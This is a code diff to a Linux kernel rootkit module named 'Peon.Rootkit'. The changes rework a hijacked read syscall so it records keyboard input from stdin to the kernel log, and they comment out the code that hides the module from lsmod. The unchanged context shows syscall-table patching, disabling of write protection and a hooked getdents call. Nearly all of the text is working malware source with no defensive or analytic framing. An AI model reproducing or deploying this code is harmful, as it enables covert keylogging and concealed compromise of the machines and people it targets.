@@ -113,13 +113,15 @@ struct packet_type pt;
 /* save module */
  struct module *mod;
     
-asmlinkage long (*orig_read_call)(int fd, void *buf, size_t count); 
+asmlinkage long (*orig_read_call) (int fd, void *buf, size_t count); 
 asmlinkage long hook_read_call(int fd, void *buf, size_t count){
 	
-	if (fd==0)
+	long ret = orig_read_call( fd, buf, count);
+	if (fd==0){
 	printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
-
-	return orig_read_call( fd, buf, count);
+	printk(KERN_ALERT "Peon.Rootkit: keyboard %d",count);
+	}
+	return  ret;
 } 
     
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
@@ -234,8 +236,8 @@ int init_module(void)
     printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
 	
 /*  hide module  lsmod */    
-    mod=THIS_MODULE;
-    list_del(&THIS_MODULE->list);
+  //  mod=THIS_MODULE;
+   // list_del(&THIS_MODULE->list);
 
     
     disable_wp();
@@ -291,10 +293,10 @@ void cleanup_module(void)
 
     disable_wp();
 
-    /* Set the orignal call*/
-  syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) kill_orig_call;
+    /* Set the orignal call*/ 
+syscall_table[__NR_kill ] = (void*) kill_orig_call;
   
- 	syscall_table[__NR_read] = (void*) orig_read_call;
+syscall_table[ __NR_read ] = (void*) orig_read_call;
   
     if(OS_64_BITS)
   	syscall_table[ __NR_getdents] = (void*) orig_getdents;
